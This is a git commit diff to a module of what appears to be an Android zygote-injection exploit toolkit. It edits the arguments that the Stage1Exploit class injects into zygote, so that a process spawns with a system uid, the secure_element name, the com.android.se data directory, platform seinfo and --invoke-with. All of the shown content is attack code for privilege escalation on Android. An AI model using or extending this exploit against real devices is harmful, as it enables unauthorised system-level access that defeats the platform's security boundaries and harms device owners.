cc50df31e873a27ae9fc1174e587e3438eb2ed0b
コアラ <189215038+coara-chocomaru@users.noreply.github.com>
2026-08-28 15:25:11 +0900

    Update zygote arguments for user and group IDs

--- zygote_injection_toolkit/stage1.py
+++ zygote_injection_toolkit/stage1.py
@@ -189,13 +189,13 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=1000",
-            "--setgid=3003",
-            "--setgroups=0",
+            "--setuid=1068",
+            "--setgid=1000",
+            "--setgroups=3003",
             "--target-sdk-version=28",
-            "--app-data-dir=/data/user/0/com.android.settings",
+            "--app-data-dir=/data/user/0/com.android.se",
             "--runtime-args",
-            "--nice-name=system_server",
+            "--nice-name=secure_element",
             "--seinfo=platform:complete",
             "--runtime-flags=1",
             "--invoke-with",
